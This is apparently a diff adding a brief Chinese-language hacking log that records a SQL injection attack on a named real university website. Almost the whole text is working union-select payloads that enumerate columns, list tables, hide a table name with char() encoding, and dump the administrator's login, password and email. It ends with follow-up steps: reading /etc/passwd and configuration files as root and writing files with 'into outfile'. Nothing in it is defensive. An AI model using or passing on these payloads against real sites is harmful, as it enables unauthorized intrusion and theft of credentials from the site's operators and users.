@@ -1,0 +1,15 @@
+注入点：http://www.ahnfmed.uam.es/en/ver_modulo.php?id=12
+order by 3 正常 order by 4出错
+http://www.ahnfmed.uam.es/en/ver_modulo.php?id=12 and 1=2 union select 1,2,3 返回 1,2
+说明显示位是1,2
+http://www.ahnfmed.uam.es/en/ver_modulo.php?id=12 and 1=2 union select group_concat(table_name),2,3 from information_schema.tables 
+
+爆出所有表名 发现ANATOMIA_Usuarios是管理员表
+http://www.ahnfmed.uam.es/en/ver_modulo.php?id=12 and 1=2 union select group_concat(column_name),2,3 from information_schema.columns where table_name=char(65,78,65,84,79,77,73,65,95,85,115,117,97,114,105,111,115) 爆出 login pass email
+http://www.ahnfmed.uam.es/en/ver_modulo.php?id=12 and 1=2 union select login,pass,3 from ANATOMIA_Usuarios 爆出管理员 账号 密码。
+
+其实这个站的权限是root,但是不支持外部连接，又找不到PHPmyadmin. 
+
+
+
+root 读/etc/passwd 读配置 然后into outfile
